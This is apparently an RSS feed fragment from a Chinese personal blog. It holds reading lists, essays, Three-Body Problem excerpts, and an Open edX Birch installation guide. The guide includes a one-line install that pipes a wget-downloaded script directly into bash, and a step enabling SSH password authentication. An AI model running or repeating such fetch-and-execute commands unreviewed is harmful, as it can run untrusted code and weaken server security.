&lt;em&gt;  《学习VI和VIM编辑器》
&lt;/em&gt;  《爱弥儿》
&lt;em&gt;  《美国大城市的死与生》
&lt;/em&gt;  《悟空传》
&lt;em&gt;  《浪潮之巅》
&lt;/em&gt;  《百年孤独》
&lt;em&gt;  《大话数据结构》
&lt;/em&gt;  《vim实用技巧》
*  《数学之美》&lt;/p&gt;
&lt;h1&gt;想读&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《统计学习方法》&lt;/li&gt;
&lt;li&gt;《用Python做科学计算》&lt;/li&gt;
&lt;li&gt;《如何变得有思想》&lt;/li&gt;
&lt;li&gt;《瓦尔登湖》&lt;/li&gt;
&lt;li&gt;《1Q84》&lt;/li&gt;
&lt;li&gt;《寻羊冒险记》&lt;/li&gt;
&lt;li&gt;《C++ Primer》&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;读了部分，放弃的&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《过于喧嚣的孤独》 ps：不感兴趣&lt;/li&gt;
&lt;li&gt;《霍乱时期的爱情》  ps：下载的版本不好，有错别字&lt;/li&gt;
&lt;li&gt;《你好，旧时光》 ps：不喜欢后边的情节&lt;/li&gt;
&lt;li&gt;《桃花扇》  ps：不如西厢记好看&lt;/li&gt;
&lt;li&gt;《芒果街上的小屋》  ps：后边部分没啥感觉&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然啦，还有不少儿童不宜或是成人不宜的书，就不列在此列出了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 18 Apr 2015 00:00:00 +0000</pubDate><guid>tag:,2015-04-18:2015-books.html</guid><category>读书</category></item><item><title>烟雨三月下扬州</title><link>/yangzhou.html</link><description>&lt;p&gt;我第一次读到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;江南三月，杂花生树，草长莺飞&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;还在北方上学，北方的三月，常有风，天空蓝的好像铁了心要跟雾霾分手，老死不相往来。我坐在图书馆靠窗的位置，窗户开着的时候，阳光就同柳絮一同晃晃悠悠进来，晃到脸上，晃倒鼻尖，痒得让人没法看书，合上书本，yy三月的江南该是怎样的一般景象，神驰天外，也就顾不上看书了，索性破罐子破摔，掏出本子，yy了一篇小说。&lt;/p&gt;
&lt;p&gt;而后兴犹未尽，还据此填了首歌词，后来读来读去，发现只顾了韵脚，全然不顾句中韵律，唱来是十分拗口的&lt;/p&gt;
&lt;p&gt;故事发生在阳春三月，说“故事”二字的时候，我很是心虚，一心只顾着三月江南，春风如何，春水如何，春色如何，完全冷落了男女主角，以至于邮件发给朋友的时候，她读完说你不如跟我学画画吧。&lt;/p&gt;
&lt;p&gt;回想起来情节稀薄得令人汗颜，角色完全是当移动相机使，用以切换风景。印象里他们去扬州的那天，天晴。北方的那种晴。&lt;/p&gt;
&lt;p&gt;不曾想到自己去的时候，竟是雨天。&lt;/p&gt;
&lt;p&gt;不大不小的那种雨，撑伞嫌烦，收伞嫌湿，文艺的说法大概叫烟雨。我走到瘦西湖一代，眼前的景色看得我一愣一愣。心情大概同贾宝玉初见林妹妹。或是张生于西厢那晚看到月亮的心情。&lt;/p&gt;
&lt;p&gt;我走到桥上，走到假山亭子上，走到樱花一地的小路上，每一处都画里一般，所有细节都恰到好处。&lt;/p&gt;
&lt;p&gt;想同朋友分享眼前的风景和心情，却无从说起，似乎陷入维特根斯坦的神秘主义，对于无法言说的东西我们只能保持沉默，只能独自感受它的升起和退潮。又实在想抓住些东西，于是就找个亭子坐下，想填一首《沁园春》，手机里翻出词牌，却发现它好像有问题，同我熟悉的几篇平仄有出入，作罢，只写了首绝句&lt;/p&gt;
&lt;p&gt;初生春水漫篱笆，&lt;br /&gt;
春雨来时堪煮茶。&lt;br /&gt;
纵使青楼春梦好，&lt;br /&gt;
牧之应恨负樱花。&lt;/p&gt;
&lt;p&gt;诗无大用，聊以纪年。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 18 Apr 2015 00:00:00 +0000</pubDate><guid>tag:,2015-04-18:yangzhou.html</guid><category>随笔</category></item><item><title>一句歌词</title><link>/the-lyrics.html</link><description>&lt;blockquote&gt;
&lt;p&gt;快乐有时候竟然辣的像一记耳光&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下班回去的路上，地铁挺挤，突然听到上边这句神来之笔，心情好极，够用一个晚上的那种开心。像小时候吃“七个小矮人”雪糕，咬到了最合口味的那根&lt;/p&gt;
&lt;p&gt;于是赶忙搜索词作者是谁，网络加载了半天，心情激动的不行，然后，然后我就坐过站了囧&lt;/p&gt;
&lt;p&gt;晚饭在南航吃，循环着这首歌，每次旋律将路过这句的时候，心情像 学生时代，周末将近，又将见到暗恋已久的同学。&lt;/p&gt;
&lt;p&gt;我想，晚饭因此起码多吃了两块肉吧。&lt;/p&gt;
&lt;p&gt;回到住处，看到朋友圈里有小伙伴引用了《湖心亭看雪》里的这句，评论说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;莫说相公痴&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我就想，是不是该也为此佳句吃点夜宵以示开心呢&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 16 Apr 2015 00:00:00 +0000</pubDate><guid>tag:,2015-04-16:the-lyrics.html</guid><category>随笔</category></item><item><title>edx-platform的两个内存泄露问题(from edX Community Blog)</title><link>/A-Tale-of-Two-Memory-Leaks.html</link><description>&lt;p&gt;之前写博客一直出于好记性不如烂笔头的想法，给自己做备忘用，后来在edX源码学习群里发现，居然有不少小伙伴在围观我的博客，开心之余，诚惶诚恐，也希望尽力给大家多提供些有价值的东西。&lt;/p&gt;
&lt;p&gt;我平时一直在跟踪edX团队的进度，无论是源码的commit还是文档的更新抑或是黑客马拉松。于是决定业余时间顺便做些“优秀文档搬运工”的工作，将我自己认为重要的edX的活动和变更信息，搬到博客上来。&lt;/p&gt;
&lt;p&gt;在下英语渣渣，翻译就不求精准啦(其实是做不到T_T)，只求达意，如有错误以及疏漏之处，欢(ni)迎(da)指(wo)正(a) ^_^&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;将edX用于生产环境的同学可能需要注意了。&lt;/p&gt;
&lt;p&gt;二月份期间，edx-platform遭遇两个和内存使用相关的问题。以下三个部分将谈论诊断细节。包括每个bug的详细分析以及诊断过程&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一部分: &lt;a href="http://vengefulpickle.com/posts/memsee-intro.html"&gt;An Introduction to Memsee&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;第二部分: &lt;a href="http://vengefulpickle.com/posts/memsee-pt1.html"&gt;A Static Leak&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;第三部分: &lt;a href="http://vengefulpickle.com/posts/memsee-pt2.html"&gt;An Incremental Leak&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ps:我之前维护的平台崩过一次，日志显示是内存泄露造成的，估计和这个相关。&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://open.edx.org/blog/tale-two-memory-leaks"&gt;A Tale of Two (Memory) Leaks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 31 Mar 2015 00:00:00 +0000</pubDate><guid>tag:,2015-03-31:A-Tale-of-Two-Memory-Leaks.html</guid><category>edx</category></item><item><title>edX 学习面板挑战赛落幕( from edX Community Blog )</title><link>/edX-Learning-Dashboard-Challenge.html</link><description>&lt;p&gt;ps：据我了解似乎edX开发者对数据挖掘和可视化展示都特别感兴趣，那么这条新闻你应该会喜欢&lt;/p&gt;
&lt;p&gt;一月份，edX在 &lt;a href="http://databits.io/"&gt;Databits&lt;/a&gt; （databits.io聚集了大量的数据科学家）举行edX学习面板挑战赛,这是&lt;a href="http://databits.io/challenges/edx-learning-dashboard-challenge"&gt;江湖悬赏令&lt;/a&gt;，比赛于03/16/2015落幕，获胜者为 Siyuan Guo&lt;/p&gt;
&lt;p&gt;此次挑战赛的目标是为edx用户提供一个可视化学习面板，用来汇总展示他们自己的学习进度以及与其他学习者的比较。&lt;/p&gt;
&lt;p&gt;......&lt;/p&gt;
&lt;p&gt;ps：比赛的更多细节和评审标准我就不译了，有兴趣的同学自己去阅读文后链接。在此只关注这个比赛将给Open edX带来的成果&lt;/p&gt;
&lt;p&gt;最终的获胜者的学习面板将会被整合到lms中，我们先睹为快:&lt;a href="http://databits.io/submission/edx-learning-dashboard"&gt;edx-learning-dashboard&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx-learning_dashboard" src="img/edx-learning_dashboard.png" /&gt;&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://open.edx.org/blog/edx-learning-dashboard-challenge"&gt;edX Learning Dashboard Challenge&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 31 Mar 2015 00:00:00 +0000</pubDate><guid>tag:,2015-03-31:edX-Learning-Dashboard-Challenge.html</guid><category>edx</category></item><item><title>edx并发性能</title><link>/edx-distributed.html</link><description>&lt;p&gt;前几日使用ab工具去测试edx并发访问性能，发现mongo占用了大量cpu，额，主要原因是我自己写的首页查询性能不好囧&lt;/p&gt;
&lt;p&gt;而后优化了下mongo查询，调整了nginx，做了cache(edX使用的是memcached缓存数据库)，并发效能顿时好了许多，单机测了下10w访问，1w并发，还凑合。&lt;/p&gt;
&lt;p&gt;再想提高性能和速度，就得考虑分布式来分离组件了(当然也需要做数据库本身的优化)，顺便阅读了知乎和豆瓣的架构经验（他们估计是国内最大的Python用户了）&lt;/p&gt;
&lt;p&gt;下一步工作，估计首先是分布式，于是github 搜了一下，发现已经有人做了&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/dhasthagheer/edx-distributed-configuration"&gt;Edx-Distributed-Configuration&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;只是有些年久失修的感觉，没有birch版的，我给项目作者提交了一个issue，希望他能同步到birch版，不过他迟迟没有回应，如果他没做之后我只能自己来做了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 26 Mar 2015 00:00:00 +0000</pubDate><guid>tag:,2015-03-26:edx-distributed.html</guid><category>edx</category></item><item><title>edX架构图</title><link>/edx-architecture.html</link><description>&lt;p&gt;&lt;img alt="edx-architecture" src="img/edx-architecture.jpg" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 23 Mar 2015 00:00:00 +0000</pubDate><guid>tag:,2015-03-23:edx-architecture.html</guid><category>edx</category></item><item><title>Open edX发布新的稳定版Birch</title><link>/named-release-birch.html</link><description>&lt;p&gt;年后准备升级之前维护的Open edX。发现edX团队于2015年02月24号发布了第二个稳定版本的Open edX，新版本命名为Birch，&lt;/p&gt;
&lt;p&gt;之前版本的几个比较影响使用的bug，诸如grades report异常之类的，在birch中都解决了的。吐槽一句(我之前修复过一个相关bug，对这部分比较熟悉)，grades部分的代码我也是醉了，效率低而逻辑乱。当然啦，模块的作者也蛮不容易的，这部分操作确实既多且杂.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://open.edx.org/blog/birch-released"&gt;官方博客&lt;/a&gt;称，birch版本是稳定版，修复了许多bug并做了大量测试。&lt;/p&gt;
&lt;p&gt;距离上个稳定版Aspen的发布已时隔四个月(Aspen发布于2014年10月)，edX老用户对Aspen应该不陌生，该版本也是稳定版，相比其他以时间打tag的release要稳定地多，推荐在生产环境中部署edX的话尽量用稳定版。具体部署方法和之前一样，不赘述&lt;/p&gt;
&lt;p&gt;相比Aspen版本，Birch版本做的改动还是很大的，就代码层面来说，涉及2500份文件的修改，移除了大约90,000行，新增了130,000+行，而所有这些变更还仅是发生在核心库。你看人家在我们过年回家忙着长肉的时候，还是蛮拼的，快给微信红包！&lt;/p&gt;
&lt;h2&gt;新特性&lt;/h2&gt;
&lt;p&gt;也许代码层面的变更不够直观，我们来看看新版本都有哪些具体可感的改良。首先是增加了不少新特性，多是名词性质的东西，偏专业，就不翻译了，懂的人自然懂，不懂的人，经过我渣渣翻译水平，就更是云里雾里了，用英文，至少方便搜索查阅&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Split Mongo Modulestore&lt;/li&gt;
&lt;li&gt;Cohorts for Discussions and Content&lt;/li&gt;
&lt;li&gt;Content Libraries and Randomized Content&lt;/li&gt;
&lt;li&gt;Prerequisite Courses&lt;/li&gt;
&lt;li&gt;Entrance Exams&lt;/li&gt;
&lt;li&gt;Student Notes&lt;/li&gt;
&lt;li&gt;Course Reruns&lt;/li&gt;
&lt;li&gt;Google Calendar and Google Drive Components&lt;/li&gt;
&lt;li&gt;Support for Graded Problems in Content Experiments&lt;/li&gt;
&lt;li&gt;ReST APIs&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-platform-api/en/latest/"&gt;Mobile API&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-enrollment-api/en/latest/"&gt;Enrollment API&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-data-analytics-api/en/latest/index.html"&gt;Data Analytics API&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以下特性默认未开启，想用的话需要自己配置一下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;学生分组功能。这是个很实用的特性，不同分组的学生将看到不同的课程内容，对个性化学习很有价值&lt;/li&gt;
&lt;li&gt;课程门槛：课程先修条件/选课资格考试&lt;/li&gt;
&lt;li&gt;新增的Xblock组件，Google Drive 和 Google Calendar XBlock. 我们望梅止渴就好啦&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;更好的国际化支持（birch版本的汉化蛮好的，需要自己汉化的地方，主要是包含平台相关变量的待翻译字符串）&lt;/li&gt;
&lt;li&gt;更清晰的代码逻辑(额，之前真是挺乱的。。)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多内容可参考&lt;a href="http://edx.readthedocs.org/projects/open-edx-release-notes/en/latest/birch.html"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;人家官方还说啦，此次的稳定版不是最终的版本，他们会再接再励的，十分期待完成可视化数据分析后的版本啊，届时可以直观地看到学习者的学习行为，结合数据挖掘，做行为分析，做课程优化，简直戳中教育者们的G点有木有，另外还有不少值得期待的特性包括 学生笔记，聊天功能，手机端支持，在线执行代码，分布式，docker支持...&lt;/p&gt;
&lt;h2&gt;打有Birch tag的库&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;edx-platform&lt;/li&gt;
&lt;li&gt;configuration&lt;/li&gt;
&lt;li&gt;cs_comments_service&lt;/li&gt;
&lt;li&gt;notifier&lt;/li&gt;
&lt;li&gt;edx-certificates&lt;/li&gt;
&lt;li&gt;xqueue&lt;/li&gt;
&lt;li&gt;edx-documentation&lt;/li&gt;
&lt;li&gt;edx-ora2&lt;/li&gt;
&lt;li&gt;XBlock&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;安装（开发与部署）&lt;/h2&gt;
&lt;p&gt;和之前没什么区别，依然是分为三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/configuration/wiki/edX-Developer-Stack"&gt;edX Developer Stack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/configuration/wiki/edX-Full-Stack"&gt;edX Full Stack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/configuration/wiki/edX-Ubuntu-12.04-64-bit-Installation"&gt;edX Ubuntu 12.04 64 bit Installation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;考虑到下载比较慢，我把下载链接也放这里啦，大家可以用迅雷下好后，手动加载box，如果你不清楚如何手动加载box，可能需要熟悉下vagrant先&lt;br /&gt;
(ps:推荐傍晚6点之后下载！！血泪教训)&lt;/p&gt;
&lt;h3&gt;devstack box&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://files.edx.org/vagrant-images/20150224-birch-devstack.box"&gt;http://files.edx.org/vagrant-images/20150224-birch-devstack.box&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;vagrant up之前，记得&lt;code&gt;export OPENEDX_RELEASE="named-release/birch"&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;fullstack box&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://files.edx.org/vagrant-images/20150224-birch-fullstack.box"&gt;http://files.edx.org/vagrant-images/20150224-birch-fullstack.box
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ubuntu12.04上部署&lt;/h3&gt;
&lt;p&gt;跟之前的部署没啥区别 ，参考官方教程 &lt;a href="https://github.com/edx/configuration/wiki/edX-Ubuntu-12.04-64-bit-Installation"&gt;edX Ubuntu 12.04 64 bit Installation&lt;/a&gt;就行  &lt;/p&gt;
&lt;h4&gt;详细安装步骤&lt;/h4&gt;
&lt;h5&gt;一步安装&lt;/h5&gt;
&lt;p&gt;OPENEDX_RELEASE=named-release/birch wget https://raw.githubusercontent.com/edx/configuration/master/util/install/vagrant.sh -O - | bash&lt;/p&gt;
&lt;h5&gt;分布安装&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;sudo apt-get update -y&lt;/li&gt;
&lt;li&gt;sudo apt-get upgrade -y&lt;/li&gt;
&lt;li&gt;sudo apt-get install -y build-essential software-properties-common python-software-properties curl git-core libxml2-dev libxslt1-dev python-pip python-apt python-dev&lt;/li&gt;
&lt;li&gt;sudo pip install --upgrade pip&lt;/li&gt;
&lt;li&gt;sudo pip install --upgrade virtualenv&lt;/li&gt;
&lt;li&gt;cd /var/tmp&lt;/li&gt;
&lt;li&gt;git clone https://github.com/edx/configuration&lt;/li&gt;
&lt;li&gt;cd /var/tmp/configuration&lt;/li&gt;
&lt;li&gt;git checkout named-release/birch&lt;/li&gt;
&lt;li&gt;vim playbooks/roles/common/defaults/main.yml , 修改其中的COMMON_SSH_PASSWORD_AUTH 为 "yes"&lt;/li&gt;
&lt;li&gt;sudo pip install -r requirements.txt&lt;/li&gt;
&lt;li&gt;cd /var/tmp/configuration/playbooks&lt;/li&gt;
&lt;li&gt;&lt;pre&gt;
sudo ansible-playbook -c local ./edx_sandbox.yml -i "localhost,"  \
-e 'edx_platform_version=named-release/birch certs_version=named-release/birch forum_version=named-release/birch xqueue_version=named-release/birch'
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外 -e 中还有一些可选参数，如果为了提高速度想用豆瓣源的话，加上COMMON_PYPI_MIRROR_URL=http://pypi.douban.com/simple，也在这儿指定域名之类的&lt;/p&gt;
&lt;p&gt;ps:如果是在虚拟机上安装可能会遇到ssl的一些问题。&lt;/p&gt;
&lt;h5&gt;从中断处继续安装&lt;/h5&gt;
&lt;p&gt;&lt;pre&gt;
sudo ansible-playbook -c local ./edx_sandbox.yml -i "localhost,"  \
-e 'edx_platform_version=named-release/birch certs_version=named-release/birch forum_version=named-release/birch xqueue_version=named-release/birch' --start-at-task="xxx"
&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;其中xxx为中断任务名&lt;/p&gt;
&lt;h2&gt;升级版本Aspen到Birch&lt;/h2&gt;
&lt;p&gt;不少小伙伴之前安装的是Aspen,官方也是挺贴心的，已经写好升级脚本了
在&lt;a href="https://github.com/edx/configuration/blob/master/util/vagrant/migrate.sh"&gt;这里&lt;/a&gt;。也在你的configuration库里&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注意&lt;/em&gt;：特别注意的是！！只能从Aspen升级到Birch，不能升级其他版本到Birch。这也是为何推荐大家使用稳定版的原因&lt;/p&gt;
&lt;h3&gt;升级方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;对于Devstack, 执行 ./migrate.sh -c devstack.&lt;/li&gt;
&lt;li&gt;对于Fullstack, 执行 ./migrate.sh -c fullstack.  就酱&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;最后&lt;/h1&gt;
&lt;p&gt;之前edX相关的文档真是凌乱极了，无力吐槽，官方估计也意识到了这点，亡羊补牢地建了&lt;a href="https://open.edx.org/"&gt;open.edx.org&lt;/a&gt;,用来汇总edX相关的东西。&lt;/p&gt;
&lt;p&gt;以此作为学习/了解/开发edX的入口再合适不过了。括弧 卖个老，想我们当年折腾的时候，各种超链接满天飞，真是辛苦了我的印象笔记，都是泪T_T。&lt;/p&gt;
&lt;p&gt;你看现在有了&lt;a href="https://open.edx.org/"&gt;open.edx.org&lt;/a&gt;，Duang~，生活一下美好多了&lt;/p&gt;
&lt;h1&gt;最后的最后&lt;/h1&gt;
&lt;p&gt;如果你觉得这篇文章对你有帮助，欢迎周末请我喝咖啡啦。&lt;/p&gt;
&lt;p&gt;这篇博客写于南京图书馆附近的星巴克二楼，我很喜欢这个靠窗的位置，之后的周六下午可能会常来这里写些东西，尽量一周写篇博客吧，也做些其他的整理。如果你来的较早，而且都准备好了咖啡(我喜欢拿铁~)，我是不会轻易拒绝的啦，我们探讨edX之余，也可以顺便聊聊人生不是，如果你连瓜子都准备了，那我们顺带连理想也一并聊了吧^_^&lt;/p&gt;
&lt;p&gt;此外&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我对 在线教育(edX)/网站架构/开源/旧体诗词/骑车/台球/阅读/旅行/晨跑/游泳 较感兴趣，以上内容都欢迎交流啦~   &lt;/li&gt;
&lt;li&gt;技术宅（好像也不很宅囧），linux/python/git/vim用户, 为了提高逼格,也在函数式（Scheme/Haskell）上花了不少时间。&lt;/li&gt;
&lt;li&gt;兴趣很杂，阅读很杂，尚未脱离低级趣味，最近在读《富爸爸穷爸爸》，喜欢好书，也喜欢与人分享讨论好书~&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://open.edx.org/blog/birch-released"&gt;birch-released&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/birch.html#open-edx-birch-release"&gt;Open edX Birch Release&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/open-edx-release-notes/en/latest/birch.html"&gt;Open edX Birch Release Notes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 07 Mar 2015 00:00:00 +0000</pubDate><guid>tag:,2015-03-07:named-release-birch.html</guid><category>edx</category></item><item><title>三体</title><link>/san-ti.html</link><description>&lt;p&gt;-----摘自刘慈欣《三体》&lt;/p&gt;
&lt;p&gt;最早是一位高中同学推荐的这本书，开始看的时候我才大一，而看完却已经工作了，中间中断过几次，因为考试或是其他，工作后又偶然想起，于是每天在地铁上看半个小时，那段时间最激动人心的便是乘地铁了，人在车里，心驰天外。&lt;/p&gt;
&lt;p&gt;摘记是从kindle导出的，工作之后接下去看的部分（从第二部开始）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;利用科学和技术产生的副作用，使公众对科学产生恐惧和厌恶，比如我们世界中技术发展导致的环境问题，想必在地球上也存在，染色计划将充分利用这此因素。第二个计划代号‘神迹’。即对地球人进行的超自然力量的展示，这个计划力图通过一系列的‘神迹’，建造一个科学逻辑无法解释的虚假宇宙。当这种假象持续一定时间后，将有可能使三体文明在那个世界成为宗教信徒的崇拜对象，在地球的思想界，非科学的思维方式就会压倒科学思维，进而导致整个科学思想体系的崩溃。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;生命这个定义，用在高维度微观宇宙中怕不合适，更准确些，我们只能说那个宇宙中存在智能或智慧。这样的可能科学家们早已预测到了，那样复杂宏大的一个世界，如果没有演化出智慧这样的东西反倒是不正常了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在这次实验中，我们是不是毁灭了微观宇宙中的一个文明？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;智慧和文明的形态是我们绝对无法想象的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;猎人的眼睛已经先被他要射的猎物抓瞎了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那么宇宙中有共同的道德准则吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有一个特殊的点是球，球类运动中只有足球赛呈现出如此清晰的数学结构，这也可能是这门运动的魅力之一&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;城市就是森林，每一个男人都是猎手，每一个女人都是陷阱。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你看，星星都是一个个的点，宇宙中各个文明社会的复杂结构，其中的混沌和随机的因素，都被这样巨大的距离滤去了，那些文明在我们看来就是一个个拥有参数的点，这在数学上就比较容易处理了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;所以你最后的成果就是纯理论的，就像欧氏几何一样，先设定几条简单的不证自明的公理，再在这些公理的基础上推导出整个理论体系&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;第一，生存是文明的第一需要；第二，文明不断增长和扩张，但宇宙中的物质总量保持不变。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;没有了对高处的恐惧就体会不到高处之美&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;“技术公有化”运动受挫所产生的影响是深远的，它使人们认识到，即使在毁灭性的三体危机面前，人类大同仍是一个遥远的梦想。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;逃亡的最大障碍不是技术。是人与人之间的争端，也就是谁走谁留的问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当整个城市就要沉到海里时，有一群人挨家挨户搜缴救生圈，集中起来毁掉，为的是既然不能都活那就谁也不要活。印象最深的是一个小女孩儿，把那些人领到一家门口，兴奋地说，他们家还有！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;废话，你看经济学的基本公理就是人类的唯利是图，没有这个前提，整个经济学就将崩溃。社会学的基本设定还没有定论，但可能比经济学的更黑暗，真理总沾着灰尘......少数人飞走可以啊，可早知如此何必当初&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你的城府真够深，那就不能显示出任何城府来，和电影上看到的不同，真正老谋深算的人不是每天阴着脸装那副鸟样儿，他们压根儿就不显出用脑子的样儿来，看上去都挺随和挺单纯的，有人显得俗里俗气婆婆妈妈，有人则大大咧咧没个正经......关键的关键是让别人别把你当回事，让他们看不起你轻视你，觉得你碍不了事，像墙角的扫把一样可有可无，最高的境界是让他们根本注意不到你，就当你不存在，直到他们死在你手里前的一刹那才回过味来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这冷静来自于我的玩世不恭，这世界上很难有什么东西让我在意。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;白蓉搂着罗辑的脖子，对着他的耳根很神秘地说：“反正有的，我告诉你吧，有的！”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你这篇小说的主人公就是你心目中最美的女孩儿，你要完全离开现实去创造这样一个天使。唯一的依据是你对女性最完美的梦想。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;要知道，一个文学人物十分钟的行为，可能是她十年的经历的反映。你不要局限于小说的情节，要去想象她的整个生命，而真正写成文字的只是冰山的一角。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
